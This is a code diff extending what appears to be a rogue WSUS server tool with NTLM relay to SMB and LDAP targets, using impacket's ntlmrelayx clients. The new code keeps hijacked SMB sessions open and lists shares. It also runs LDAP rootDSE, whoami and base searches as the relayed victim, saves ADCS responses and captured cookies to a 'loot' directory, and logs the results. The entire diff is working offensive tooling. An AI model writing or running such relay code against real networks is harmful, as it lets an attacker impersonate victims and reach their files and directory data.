@@ -356,9 +356,24 @@ class HTTPNTLMRelayBackend:
             f"{key}server": headers.get("server", ""),
             f"{key}content_type": headers.get("content-type", ""),
             f"{key}location": headers.get("location", ""),
+            f"{key}set_cookie": headers.get("set-cookie", ""),
             f"{key}www_authenticate": headers.get("www-authenticate", ""),
             f"{key}body_hint": body[:200].decode("latin-1", errors="replace"),
         }
+
+    def _write_debug_body(self, label, body):
+        if not self.adcs_loot_dir:
+            return ""
+
+        try:
+            os.makedirs(self.adcs_loot_dir, exist_ok=True)
+            stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
+            path = os.path.join(self.adcs_loot_dir, f"{stamp}-{label}.html")
+            with open(path, "wb") as fh:
+                fh.write(body)
+            return path
+        except OSError:
+            return ""
 
     def _adcs_base_path(self):
         path = self.path.split("?", 1)[0]
@@ -625,12 +640,18 @@ class HTTPNTLMRelayBackend:
         if submit_res.status != 200:
             result["adcs_issue_state"] = "submit-failed"
             result["adcs_issue_error"] = f"submit HTTP {submit_res.status}"
+            debug_path = self._write_debug_body("adcs-submit-failed", submit_body)
+            if debug_path:
+                result["adcs_debug_path"] = debug_path
             return result
 
         request_id = self._extract_adcs_request_id(submit_body)
         if not request_id:
             result["adcs_issue_state"] = "request-id-missing"
             result["adcs_issue_error"] = "certificate request ID not found"
+            debug_path = self._write_debug_body("adcs-submit-no-reqid", submit_body)
+            if debug_path:
+                result["adcs_debug_path"] = debug_path
             return result
 
         result["adcs_certificate_id"] = request_id
@@ -667,9 +688,21 @@ class HTTPNTLMRelayBackend:
         if cert_res.status != 200:
             result["adcs_issue_state"] = "certificate-fetch-failed"
             result["adcs_issue_error"] = f"certificate HTTP {cert_res.status}"
+            debug_path = self._write_debug_body("adcs-cert-fetch-failed", cert_body)
+            if debug_path:
+                result["adcs_debug_path"] = debug_path
             return result
 
-        cert_obj = self._adcs_load_certificate(crypto, cert_body)
+        try:
+            cert_obj = self._adcs_load_certificate(crypto, cert_body)
+        except Exception as err:
+            result["adcs_issue_state"] = "certificate-parse-failed"
+            result["adcs_issue_error"] = str(err)
+            debug_path = self._write_debug_body("adcs-cert-parse-failed", cert_body)
+            if debug_path:
+                result["adcs_debug_path"] = debug_path
+            return result
+
         pfx_data = self._adcs_generate_pfx(crypto, key, cert_obj)
         os.makedirs(self.adcs_loot_dir, exist_ok=True)
         pfx_name = self._sanitize_filename(identity or username)
@@ -987,6 +1020,664 @@ class HTTPNTLMRelayBackend:
 
         for session in sessions:
             session["conn"].close()
+
+        return len(sessions)
+
+
+class _SMBRelayConfig:
+    """Tiny ntlmrelayx-compatible config object for SMBRelayClient."""
+
+    smb2support = True
+    remove_mic = False
+    remove_target = False
+    domainIp = None
+    machineAccount = None
+    machineHashes = None
+
+
+class SMBNTLMRelayBackend:
+    def __init__(self, target_url, timeout=10, action="auth-only"):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.action = action
+        self.sessions = {}
+        self.live_sessions = {}
+        self.next_live_session_id = 1
+        self.lock = threading.RLock()
+
+        parsed = urlparse(target_url)
+        if parsed.scheme != "smb" or not parsed.hostname:
+            raise ValueError("SMB relay target must be smb://host[:port]/")
+
+        self.target = parsed
+        self.host = parsed.hostname
+        self.port = parsed.port or 445
+
+    def _load_impacket(self):
+        try:
+            from impacket.examples.ntlmrelayx.clients.smbrelayclient import (  # type: ignore
+                SMBRelayClient,
+            )
+            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
+        except ImportError as err:
+            raise RuntimeError("SMB relay requires impacket") from err
+
+        return SMBRelayClient, ERROR_MESSAGES, STATUS_SUCCESS
+
+    @staticmethod
+    def _decode_token(token):
+        return base64.b64decode(token)
+
+    @staticmethod
+    def _status_name(error_messages, status):
+        name, _ = error_messages.get(status, ("UNKNOWN", ""))
+        return name
+
+    @staticmethod
+    def _clean_smb_text(value):
+        if isinstance(value, bytes):
+            value = value.decode("utf-8", errors="replace")
+        return str(value).rstrip("\x00")
+
+    def _session_info(self, client):
+        session = client.session
+        info = {
+            "smb_target": f"{self.host}:{self.port}",
+            "smb_dialect": "",
+            "smb_signing_required": None,
+            "smb_server_name": "",
+            "smb_server_domain": "",
+            "smb_server_os": "",
+            "smb_guest": None,
+        }
+
+        if not session:
+            return info
+
+        getters = {
+            "smb_dialect": session.getDialect,
+            "smb_signing_required": session.isSigningRequired,
+            "smb_server_name": session.getServerName,
+            "smb_server_domain": session.getServerDomain,
+            "smb_server_os": session.getServerOS,
+            "smb_guest": session.isGuestSession,
+        }
+        for key, getter in getters.items():
+            try:
+                info[key] = getter()
+            except Exception:
+                pass
+
+        return info
+
+    def _list_shares(self, client):
+        shares = []
+        for share in client.session.listShares():
+            shares.append({
+                "name": self._clean_smb_text(share["shi1_netname"]),
+                "remark": self._clean_smb_text(share["shi1_remark"]),
+            })
+        return shares
+
+    def _keep_live_session(self, client, identity, username, result):
+        with self.lock:
+            session_id = self.next_live_session_id
+            self.next_live_session_id += 1
+            self.live_sessions[session_id] = {
+                "client": client,
+                "identity": identity,
+                "username": username,
+                "created_at": time.time(),
+                "last_used": time.time(),
+                "info": dict(result),
+            }
+        return session_id
+
+    def list_live_sessions(self):
+        with self.lock:
+            records = []
+            for session_id, record in sorted(self.live_sessions.items()):
+                info = dict(record.get("info", {}))
+                records.append({
+                    "id": session_id,
+                    "identity": record.get("identity", ""),
+                    "username": record.get("username", ""),
+                    "age": int(time.time() - record.get("created_at", time.time())),
+                    "idle": int(time.time() - record.get("last_used", time.time())),
+                    "target": info.get("smb_target", f"{self.host}:{self.port}"),
+                    "server": info.get("smb_server_name", ""),
+                    "domain": info.get("smb_server_domain", ""),
+                    "signing_required": info.get("smb_signing_required"),
+                })
+            return records
+
+    def list_live_session_shares(self):
+        with self.lock:
+            sessions = list(self.live_sessions.items())
+
+        results = []
+        for session_id, record in sessions:
+            try:
+                shares = self._list_shares(record["client"])
+                state = "shares-listed"
+                error = ""
+                with self.lock:
+                    if session_id in self.live_sessions:
+                        self.live_sessions[session_id]["last_used"] = time.time()
+            except Exception as err:
+                shares = []
+                state = "list-shares-failed"
+                error = str(err)
+
+            results.append({
+                "id": session_id,
+                "identity": record.get("identity", ""),
+                "shares": shares,
+                "share_count": len(shares),
+                "state": state,
+                "error": error,
+            })
+
+        return results
+
+    def close_live_sessions(self):
+        with self.lock:
+            sessions = list(self.live_sessions.values())
+            self.live_sessions = {}
+
+        for record in sessions:
+            try:
+                record["client"].killConnection()
+            except Exception:
+                pass
+
+        return len(sessions)
+
+    def start_type1(self, session_key, type1_token):
+        SMBRelayClient, _, _ = self._load_impacket()
+        client = SMBRelayClient(_SMBRelayConfig(), self.target, self.port)
+
+        try:
+            with self.lock:
+                old_session = self.sessions.pop(session_key, None)
+            if old_session:
+                old_session["client"].killConnection()
+
+            if not client.initConnection():
+                raise RuntimeError("SMB target connection failed")
+
+            challenge = client.sendNegotiate(self._decode_token(type1_token))
+            if not challenge:
+                raise RuntimeError("SMB target did not return NTLM Type 2")
+
+            challenge_data = challenge.getData()
+            with self.lock:
+                self.sessions[session_key] = {
+                    "client": client,
+                    "created_at": time.time(),
+                    "target_status_type2": "STATUS_MORE_PROCESSING_REQUIRED",
+                    "session_info": self._session_info(client),
+                }
+
+            return base64.b64encode(challenge_data).decode("ascii")
+        except Exception:
+            client.killConnection()
+            raise
+
+    def finish_type3(self, session_key, type3_token, identity="", username=""):
+        with self.lock:
+            session = self.sessions.pop(session_key, None)
+        if not session:
+            raise RuntimeError("missing relay session for Type 3")
+
+        client = session["client"]
+        _, error_messages, status_success = self._load_impacket()
+        keep_client = False
+
+        try:
+            _, status = client.sendAuth(self._decode_token(type3_token))
+            status_name = self._status_name(error_messages, status)
+            authenticated = status == status_success
+            result = {
+                "status": status,
+                "reason": status_name,
+                "authenticated": authenticated,
+                "type3_accepted": authenticated,
+                "auth_validation": "smb-session-setup" if authenticated else "rejected",
+                "action": self.action,
+                "target_status_type2": session.get("target_status_type2"),
+                "service": "smb",
+                "service_validated": authenticated,
+                "identity": identity,
+                "username": username,
+                "shares": [],
+                "share_count": 0,
+                "smb_action_state": "not-run",
+                "smb_action_error": "",
+                "smb_session_id": "",
+                "smb_session_kept": False,
+                **session.get("session_info", {}),
+            }
+
+            if authenticated:
+                client.setClientId()
+                result.update(self._session_info(client))
+
+                if self.action == "keep-session":
+                    session_id = self._keep_live_session(
+                        client,
+                        identity,
+                        username,
+                        result,
+                    )
+                    keep_client = True
+                    result.update({
+                        "smb_session_id": session_id,
+                        "smb_session_kept": True,
+                        "smb_action_state": "session-kept",
+                    })
+                elif self.action == "list-shares":
+                    try:
+                        shares = self._list_shares(client)
+                        result.update({
+                            "shares": shares,
+                            "share_count": len(shares),
+                            "smb_action_state": "shares-listed",
+                        })
+                    except Exception as err:
+                        result.update({
+                            "smb_action_state": "list-shares-failed",
+                            "smb_action_error": str(err),
+                        })
+                else:
+                    result["smb_action_state"] = "auth-only"
+
+            return result
+        finally:
+            if not keep_client:
+                client.killConnection()
+
+    def drop_session(self, session_key):
+        with self.lock:
+            session = self.sessions.pop(session_key, None)
+        if session:
+            session["client"].killConnection()
+
+    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
+        now = time.time()
+        with self.lock:
+            stale = [
+                key for key, session in self.sessions.items()
+                if now - session.get("created_at", now) > max_age
+            ]
+            sessions = [self.sessions.pop(key) for key in stale]
+
+        for session in sessions:
+            session["client"].killConnection()
+
+        return len(sessions)
+
+
+class _LDAPRelayConfig:
+    """Small ntlmrelayx-compatible config object for LDAP relay clients."""
+
+    remove_mic = False
+    remove_sign_seal = False
+
+
+class LDAPNTLMRelayBackend:
+    ROOTDSE_ATTRIBUTES = (
+        "defaultNamingContext",
+        "dnsHostName",
+        "namingContexts",
+        "supportedLDAPVersion",
+        "supportedSASLMechanisms",
+        "vendorName",
+    )
+
+    def __init__(self, target_url, timeout=10, action="auth-only"):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.action = action
+        self.sessions = {}
+        self.lock = threading.RLock()
+
+        parsed = urlparse(target_url)
+        if parsed.scheme not in ("ldap", "ldaps") or not parsed.hostname:
+            raise ValueError("LDAP relay target must be ldap:// or ldaps://")
+
+        self.target = parsed
+        self.scheme = parsed.scheme
+        self.host = parsed.hostname
+        self.port = parsed.port or (636 if parsed.scheme == "ldaps" else 389)
+
+    def _load_impacket(self):
+        try:
+            from impacket.examples.ntlmrelayx.clients.ldaprelayclient import (  # type: ignore
+                LDAPRelayClient,
+                LDAPRelayClientException,
+                LDAPSRelayClient,
+            )
+            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
+            from ldap3 import BASE  # type: ignore
+        except ImportError as err:
+            raise RuntimeError("LDAP relay requires impacket and ldap3") from err
+
+        return (
+            LDAPRelayClient,
+            LDAPSRelayClient,
+            LDAPRelayClientException,
+            ERROR_MESSAGES,
+            STATUS_SUCCESS,
+            BASE,
+        )
+
+    @staticmethod
+    def _decode_token(token):
+        return base64.b64decode(token)
+
+    @staticmethod
+    def _status_name(error_messages, status):
+        name, _ = error_messages.get(status, ("UNKNOWN", ""))
+        return name
+
+    @staticmethod
+    def _ldap_value(value):
+        if isinstance(value, bytes):
+            return value.decode("utf-8", errors="replace")
+        if isinstance(value, (list, tuple)):
+            return [LDAPNTLMRelayBackend._ldap_value(item) for item in value]
+        return str(value)
+
+    @classmethod
+    def _entry_attributes(cls, session):
+        entries = getattr(session, "entries", []) or []
+        if not entries:
+            return {}
+
+        attributes = getattr(entries[0], "entry_attributes_as_dict", {}) or {}
+        return {
+            key: cls._ldap_value(value)
+            for key, value in attributes.items()
+        }
+
+    @staticmethod
+    def _ldap_result(session):
+        result = getattr(session, "result", {}) or {}
+        return {
+            "ldap_result_code": result.get("result", ""),
+            "ldap_result_description": result.get("description", ""),
+            "ldap_diagnostic_message": result.get("message", ""),
+        }
+
+    @staticmethod
+    def _first_ldap_value(value):
+        if isinstance(value, list):
+            return value[0] if value else ""
+        return value or ""
+
+    def _new_client(self):
+        (
+            LDAPRelayClient,
+            LDAPSRelayClient,
+            _,
+            _,
+            _,
+            _,
+        ) = self._load_impacket()
+        client_class = LDAPSRelayClient if self.scheme == "ldaps" else LDAPRelayClient
+        return client_class(_LDAPRelayConfig(), self.target, self.port)
+
+    def _session_info(self, client):
+        return {
+            "ldap_target": f"{self.host}:{self.port}",
+            "ldap_transport": self.scheme,
+            "ldap_server_info_available": bool(
+                getattr(getattr(client, "session", None), "server", None)
+            ),
+        }
+
+    def _rootdse(self, client):
+        _, _, _, _, _, base_scope = self._load_impacket()
+        session = client.session
+        success = session.search(
+            search_base="",
+            search_filter="(objectClass=*)",
+            search_scope=base_scope,
+            attributes=list(self.ROOTDSE_ATTRIBUTES),
+        )
+        attributes = self._entry_attributes(session)
+        result = {
+            "ldap_rootdse_ok": bool(success),
+            "ldap_default_naming_context": self._first_ldap_value(
+                attributes.get("defaultNamingContext", "")
+            ),
+            "ldap_dns_host_name": self._first_ldap_value(
+                attributes.get("dnsHostName", "")
+            ),
+            "ldap_naming_contexts": attributes.get("namingContexts", []),
+            "ldap_supported_versions": attributes.get("supportedLDAPVersion", []),
+            "ldap_supported_sasl_mechanisms": attributes.get(
+                "supportedSASLMechanisms", []
+            ),
+            "ldap_vendor_name": self._first_ldap_value(
+                attributes.get("vendorName", "")
+            ),
+        }
+        result.update(self._ldap_result(session))
+        return result
+
+    def _whoami(self, client):
+        session = client.session
+        success = session.extend.standard.who_am_i()
+        result = {
+            "ldap_whoami_ok": bool(success),
+            "ldap_whoami": self._ldap_value(
+                (getattr(session, "result", {}) or {}).get("responseValue", "")
+            ),
+        }
+        result.update(self._ldap_result(session))
+        return result
+
+    def _base_search(self, client):
+        _, _, _, _, _, base_scope = self._load_impacket()
+        rootdse = self._rootdse(client)
+        base_dn = rootdse.get("ldap_default_naming_context", "")
+        if not base_dn:
+            return {
+                **rootdse,
+                "ldap_base_search_ok": False,
+                "ldap_base_search_error": "defaultNamingContext was not returned",
+                "ldap_base_dn": "",
+                "ldap_base_object_dn": "",
+                "ldap_base_object_classes": [],
+            }
+
+        session = client.session
+        success = session.search(
+            search_base=base_dn,
+            search_filter="(objectClass=*)",
+            search_scope=base_scope,
+            attributes=["distinguishedName", "objectClass", "name"],
+        )
+        attributes = self._entry_attributes(session)
+        entries = getattr(session, "entries", []) or []
+        entry_dn = str(getattr(entries[0], "entry_dn", "")) if entries else ""
+        result = {
+            **rootdse,
+            "ldap_base_search_ok": bool(success),
+            "ldap_base_search_error": "",
+            "ldap_base_dn": base_dn,
+            "ldap_base_object_dn": entry_dn,
+            "ldap_base_object_classes": attributes.get("objectClass", []),
+        }
+        result.update(self._ldap_result(session))
+        return result
+
+    def preflight(self):
+        client = self._new_client()
+        try:
+            if not client.initConnection():
+                raise RuntimeError("LDAP target connection failed")
+
+            result = {
+                "ldap_preflight": True,
+                "authenticated": False,
+                "service": "ldap",
+                "service_validated": False,
+                **self._session_info(client),
+            }
+            result.update(self._rootdse(client))
+            result["service_validated"] = result["ldap_rootdse_ok"]
+            return result
+        finally:
+            client.killConnection()
+
+    def start_type1(self, session_key, type1_token):
+        client = self._new_client()
+
+        try:
+            with self.lock:
+                old_session = self.sessions.pop(session_key, None)
+            if old_session:
+                old_session["client"].killConnection()
+
+            if not client.initConnection():
+                raise RuntimeError("LDAP target connection failed")
+
+            challenge = client.sendNegotiate(self._decode_token(type1_token))
+            if not challenge:
+                raise RuntimeError("LDAP target did not return NTLM Type 2")
+
+            with self.lock:
+                self.sessions[session_key] = {
+                    "client": client,
+                    "created_at": time.time(),
+                    "target_status_type2": "LDAP_SICILY_NEGOTIATE_NTLM",
+                    "session_info": self._session_info(client),
+                }
+
+            return base64.b64encode(challenge.getData()).decode("ascii")
+        except Exception:
+            client.killConnection()
+            raise
+
+    def finish_type3(self, session_key, type3_token, identity="", username=""):
+        with self.lock:
+            session = self.sessions.pop(session_key, None)
+        if not session:
+            raise RuntimeError("missing relay session for Type 3")
+
+        client = session["client"]
+        _, _, ldap_error, error_messages, status_success, _ = self._load_impacket()
+        authenticated = False
+
+        try:
+            try:
+                _, status = client.sendAuth(self._decode_token(type3_token))
+                reason = self._status_name(error_messages, status)
+                authenticated = status == status_success
+                error = ""
+            except ldap_error as err:
+                status = None
+                reason = "LDAP_RELAY_ERROR"
+                authenticated = False
+                error = str(err)
+
+            result = {
+                "status": status,
+                "reason": reason,
+                "authenticated": authenticated,
+                "type3_accepted": authenticated,
+                "auth_validation": "ldap-bind" if authenticated else "rejected",
+                "action": self.action,
+                "target_status_type2": session.get("target_status_type2"),
+                "service": "ldap",
+                "service_validated": authenticated,
+                "identity": identity,
+                "username": username,
+                "ldap_action_state": "not-run",
+                "ldap_action_error": error,
+                "ldap_rootdse_ok": None,
+                "ldap_whoami_ok": None,
+                "ldap_base_search_ok": None,
+                **session.get("session_info", {}),
+                **self._ldap_result(client.session),
+            }
+
+            if not authenticated:
+                if "signing is enabled" in error.lower():
+                    result["ldap_signing_required"] = True
+                return result
+
+            if self.action == "ldap-rootdse":
+                action_result = self._rootdse(client)
+                result.update(action_result)
+                result["ldap_action_state"] = (
+                    "rootdse-read" if action_result["ldap_rootdse_ok"] else "rootdse-failed"
+                )
+                result["service_validated"] = action_result["ldap_rootdse_ok"]
+            elif self.action == "ldap-whoami":
+                action_result = self._whoami(client)
+                result.update(action_result)
+                result["ldap_action_state"] = (
+                    "whoami-read" if action_result["ldap_whoami_ok"] else "whoami-failed"
+                )
+                result["service_validated"] = action_result["ldap_whoami_ok"]
+            elif self.action == "ldap-base-search":
+                action_result = self._base_search(client)
+                result.update(action_result)
+                result["ldap_action_state"] = (
+                    "base-read"
+                    if action_result["ldap_base_search_ok"]
+                    else "base-search-failed"
+                )
+                result["service_validated"] = action_result["ldap_base_search_ok"]
+            else:
+                result["ldap_action_state"] = "auth-only"
+
+            return result
+        except Exception as err:
+            return {
+                "status": None,
+                "reason": "LDAP_ACTION_ERROR",
+                "authenticated": authenticated,
+                "type3_accepted": authenticated,
+                "auth_validation": "ldap-bind" if authenticated else "rejected",
+                "action": self.action,
+                "target_status_type2": session.get("target_status_type2"),
+                "service": "ldap",
+                "service_validated": False,
+                "identity": identity,
+                "username": username,
+                "ldap_action_state": "action-error",
+                "ldap_action_error": str(err),
+                "ldap_rootdse_ok": None,
+                "ldap_whoami_ok": None,
+                "ldap_base_search_ok": None,
+                **session.get("session_info", {}),
+                **self._ldap_result(client.session),
+            }
+        finally:
+            client.killConnection()
+
+    def drop_session(self, session_key):
+        with self.lock:
+            session = self.sessions.pop(session_key, None)
+        if session:
+            session["client"].killConnection()
+
+    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
+        now = time.time()
+        with self.lock:
+            stale = [
+                key for key, session in self.sessions.items()
+                if now - session.get("created_at", now) > max_age
+            ]
+            sessions = [self.sessions.pop(key) for key in stale]
+
+        for session in sessions:
+            session["client"].killConnection()
 
         return len(sessions)
 
@@ -1314,6 +2005,8 @@ _hash_file = None
 _json_event_file = None
 _hash_seen = set()
 _captured_hashes = []
+_active_relay_backend = None
+_active_relay_lock = threading.RLock()
 
 _STYLE = {
     "GetConfig":              "dim",
@@ -1325,11 +2018,89 @@ _STYLE = {
     "ReportEventBatch":       "bright_blue",
     "FileDownload":           "bright_cyan",
     "HashCapture":            "bold yellow",
+    "LDAPPreflight":          "bright_magenta",
     "WARN":                   "bold red",
 }
 
 def _ts():
     return datetime.datetime.now().strftime("%H:%M:%S")
+
+
+def _active_smb_backend():
+    with _active_relay_lock:
+        backend = _active_relay_backend
+
+    if isinstance(backend, SMBNTLMRelayBackend):
+        return backend
+
+    return None
+
+
+def _print_smb_sessions():
+    backend = _active_smb_backend()
+    if not backend:
+        _console.print("  [yellow]No active SMB relay backend[/]")
+        return
+
+    sessions = backend.list_live_sessions()
+    if not sessions:
+        _console.print("  [yellow]No kept SMB sessions[/]")
+        return
+
+    _console.rule(style="bright_black")
+    _console.print(
+        f"  [bold cyan]{'ID':<5}{'Identity':<28}{'Target':<22}"
+        f"{'Server':<16}{'Sign':<8}Age/Idle[/]"
+    )
+    for session in sessions:
+        identity = session.get("identity", "")[:26]
+        target = session.get("target", "")[:20]
+        server = session.get("server", "")[:14]
+        sign = str(session.get("signing_required", ""))[:6]
+        _console.print(
+            f"  [white]{session['id']:<5}{identity:<28}{target:<22}"
+            f"{server:<16}{sign:<8}{session['age']}s/{session['idle']}s[/]"
+        )
+    _console.rule(style="bright_black")
+
+
+def _print_smb_session_shares():
+    backend = _active_smb_backend()
+    if not backend:
+        _console.print("  [yellow]No active SMB relay backend[/]")
+        return
+
+    results = backend.list_live_session_shares()
+    if not results:
+        _console.print("  [yellow]No kept SMB sessions[/]")
+        return
+
+    _console.rule(style="bright_black")
+    for result in results:
+        header = (
+            f"  [bold cyan]SMB session {result['id']}[/] "
+            f"[white]{result.get('identity', '')}[/] "
+            f"[dim]{result['state']}[/]"
+        )
+        if result.get("error"):
+            header += f" [red]{result['error']}[/]"
+        _console.print(header)
+        for share in result.get("shares", []):
+            _console.print(
+                f"    [green]{share.get('name', ''):<18}[/] "
+                f"[dim]{share.get('remark', '')}[/]"
+            )
+    _console.rule(style="bright_black")
+
+
+def _close_smb_sessions():
+    backend = _active_smb_backend()
+    if not backend:
+        _console.print("  [yellow]No active SMB relay backend[/]")
+        return
+
+    closed = backend.close_live_sessions()
+    _console.print(f"  [bold yellow]Closed {closed} kept SMB session(s)[/]")
 
 
 def _log(level, ip, action, detail="", direction=""):
@@ -1658,7 +2429,12 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                 self._send_ntlm_401(type2, proxy=proxy)
                 return "handled"
 
-            if mode == "relay-http":
+            if mode in ("relay-http", "relay-smb", "relay-ldap"):
+                relay_label = {
+                    "relay-http": "HTTP",
+                    "relay-smb": "SMB",
+                    "relay-ldap": "LDAP",
+                }[mode]
                 backend = None
                 try:
                     backend = self.server.ntlm_relay_backend
@@ -1674,12 +2450,12 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                 except Exception as err:
                     if backend:
                         backend.drop_session(session_key)
-                    _log(0, ip, "WARN", f"HTTP relay Type 1 failed: {err}")
+                    _log(0, ip, "WARN", f"{relay_label} relay Type 1 failed: {err}")
                     self._send_empty_response(502)
                     return "handled"
 
                 _log(0, ip, "WARN",
-                     f"relayed Type 1 to target; returning target Type 2 on {self.path}")
+                     f"relayed Type 1 to {relay_label} target; returning target Type 2 on {self.path}")
                 self._send_ntlm_401(type2, proxy=proxy)
                 return "handled"
 
@@ -1701,7 +2477,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                 identity = f'{parsed["domain"]}\\{parsed["username"]}'
 
             session = None
-            if mode in ("capture", "relay-http"):
+            if mode in ("capture", "relay-http", "relay-smb", "relay-ldap"):
                 with self.server.ntlm_lock:
                     session = self.server.ntlm_sessions.pop(session_key, None)
             challenge = session["challenge"] if session else None
@@ -1752,7 +2528,12 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                         direction="request",
                     )
 
-            if mode == "relay-http":
+            if mode in ("relay-http", "relay-smb", "relay-ldap"):
+                relay_label = {
+                    "relay-http": "HTTP",
+                    "relay-smb": "SMB",
+                    "relay-ldap": "LDAP",
+                }[mode]
                 try:
                     result = self.server.ntlm_relay_backend.finish_type3(
                         session_key,
@@ -1760,33 +2541,88 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                         identity=identity,
                         username=parsed["username"],
                     )
-                    relay_detail = (
-                        f"identity={identity} "
-                        f"target_status={result['status']} "
-                        f"reason={result['reason']} "
-                        f"authenticated={result['authenticated']} "
-                        f"validation={result.get('auth_validation', '')} "
-                        f"followup={result.get('followup_state', '')} "
-                        f"service={result.get('service', '')} "
-                        f"service_validated={result.get('service_validated', False)} "
-                        f"adcs_score={result.get('adcs_score', '')} "
-                        f"adcs_issued={result.get('adcs_issued', '')} "
-                        f"cert_id={result.get('adcs_certificate_id', '')} "
-                        f"pfx={result.get('adcs_pfx_path', '')} "
-                        f"content_type={result.get('content_type', '')}"
-                    )
-                    _log(0, ip, "WARN", f"HTTP relay result  {relay_detail}")
+                    if mode == "relay-smb":
+                        share_names = ",".join(
+                            share.get("name", "")
+                            for share in result.get("shares", [])[:8]
+                        )
+                        relay_detail = (
+                            f"identity={identity} "
+                            f"target_status=0x{result['status']:08x} "
+                            f"reason={result['reason']} "
+                            f"authenticated={result['authenticated']} "
+                            f"validation={result.get('auth_validation', '')} "
+                            f"service={result.get('service', '')} "
+                            f"service_validated={result.get('service_validated', False)} "
+                            f"signing_required={result.get('smb_signing_required', '')} "
+                            f"server={result.get('smb_server_name', '')} "
+                            f"domain={result.get('smb_server_domain', '')} "
+                            f"session_id={result.get('smb_session_id', '')} "
+                            f"shares={result.get('share_count', '')} "
+                            f"share_names={share_names} "
+                            f"action_state={result.get('smb_action_state', '')}"
+                        )
+                    elif mode == "relay-ldap":
+                        status = result.get("status")
+                        status_text = (
+                            f"0x{status:08x}"
+                            if isinstance(status, int)
+                            else str(status or "")
+                        )
+                        relay_detail = (
+                            f"identity={identity} "
+                            f"target_status={status_text} "
+                            f"reason={result.get('reason', '')} "
+                            f"authenticated={result.get('authenticated', False)} "
+                            f"validation={result.get('auth_validation', '')} "
+                            f"service={result.get('service', '')} "
+                            f"service_validated={result.get('service_validated', False)} "
+                            f"transport={result.get('ldap_transport', '')} "
+                            f"rootdse={result.get('ldap_rootdse_ok', '')} "
+                            f"base_dn={result.get('ldap_default_naming_context', '')} "
+                            f"whoami={result.get('ldap_whoami', '')} "
+                            f"action_state={result.get('ldap_action_state', '')} "
+                            f"diagnostic={result.get('ldap_diagnostic_message', '') or result.get('ldap_action_error', '')}"
+                        )
+                    else:
+                        relay_detail = (
+                            f"identity={identity} "
+                            f"target_status={result['status']} "
+                            f"reason={result['reason']} "
+                            f"authenticated={result['authenticated']} "
+                            f"validation={result.get('auth_validation', '')} "
+                            f"followup={result.get('followup_state', '')} "
+                            f"service={result.get('service', '')} "
+                            f"service_validated={result.get('service_validated', False)} "
+                            f"adcs_score={result.get('adcs_score', '')} "
+                            f"adcs_issued={result.get('adcs_issued', '')} "
+                            f"issue_state={result.get('adcs_issue_state', '')} "
+                            f"cert_id={result.get('adcs_certificate_id', '')} "
+                            f"pfx={result.get('adcs_pfx_path', '')} "
+                            f"debug={result.get('adcs_debug_path', '')} "
+                            f"cookie={result.get('set_cookie', '') or result.get('followup_set_cookie', '')} "
+                            f"content_type={result.get('content_type', '')}"
+                        )
+                    _log(0, ip, "WARN", f"{relay_label} relay result  {relay_detail}")
                     _emit_json_event(
-                        "http_relay_result",
+                        {
+                            "relay-http": "http_relay_result",
+                            "relay-smb": "smb_relay_result",
+                            "relay-ldap": "ldap_relay_result",
+                        }[mode],
                         ip=ip,
                         path=self.path,
                         identity=identity,
                         result=result,
                     )
                 except Exception as err:
-                    _log(0, ip, "WARN", f"HTTP relay Type 3 failed: {err}")
+                    _log(0, ip, "WARN", f"{relay_label} relay Type 3 failed: {err}")
                     _emit_json_event(
-                        "http_relay_error",
+                        {
+                            "relay-http": "http_relay_error",
+                            "relay-smb": "smb_relay_error",
+                            "relay-ldap": "ldap_relay_error",
+                        }[mode],
                         ip=ip,
                         path=self.path,
                         identity=identity,
@@ -2002,7 +2838,10 @@ def run(
     adcs_loot_dir="loot",
     ntlm_session_key="ip",
     ntlm_protect_downloads=False,
+    relay_preflight=False,
 ):
+    global _active_relay_backend
+
     httpd = ThreadingHTTPServer((host, port), WSUSBaseServer)
     httpd.ntlm_mode = ntlm_mode
     httpd.ntlm_sessions = {}
@@ -2019,13 +2858,49 @@ def run(
             adcs_alt_name=adcs_alt_name,
             adcs_loot_dir=adcs_loot_dir,
         )
+    elif ntlm_mode == "relay-smb":
+        httpd.ntlm_relay_backend = SMBNTLMRelayBackend(
+            relay_target,
+            action=relay_action,
+        )
+    elif ntlm_mode == "relay-ldap":
+        httpd.ntlm_relay_backend = LDAPNTLMRelayBackend(
+            relay_target,
+            action=relay_action,
+        )
     else:
         httpd.ntlm_relay_backend = None
+
+    with _active_relay_lock:
+        _active_relay_backend = httpd.ntlm_relay_backend
+
+    if relay_preflight and isinstance(httpd.ntlm_relay_backend, LDAPNTLMRelayBackend):
+        try:
+            preflight = httpd.ntlm_relay_backend.preflight()
+            detail = (
+                f"target={preflight.get('ldap_target', '')} "
+                f"transport={preflight.get('ldap_transport', '')} "
+                f"rootdse={preflight.get('ldap_rootdse_ok', False)} "
+                f"base_dn={preflight.get('ldap_default_naming_context', '')}"
+            )
+            _log(0, "-", "LDAPPreflight", detail)
+            _emit_json_event("ldap_relay_preflight", result=preflight)
+        except Exception as err:
+            _log(0, "-", "WARN", f"LDAP relay preflight failed: {err}")
+            _emit_json_event("ldap_relay_preflight_error", error=str(err))
 
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
+    finally:
+        backend = getattr(httpd, "ntlm_relay_backend", None)
+        if isinstance(backend, SMBNTLMRelayBackend):
+            backend.close_live_sessions()
+        with _active_relay_lock:
+            if _active_relay_backend is backend:
+                _active_relay_backend = None
+
     httpd.server_close()
 
 
@@ -2033,7 +2908,7 @@ def run(
 # Banner
 # ---------------------------------------------------------------------------
 
-def _print_banner(host, port, rotate_hours=0):
+def _print_banner(host, port, rotate_hours=0, ntlm_mode="off"):
     _console.print()
     _console.print("[bold red]p y w s u s[/]", justify="center")
     _console.print()
@@ -2041,11 +2916,17 @@ def _print_banner(host, port, rotate_hours=0):
         f"  [dim]·[/]  [dim]rotate every[/] [magenta]{rotate_hours}h[/]"
         if rotate_hours else ""
     )
+    smb_tag = (
+        f"  [dim]·[/]  [bold white]s[/][dim]: smb sessions[/]"
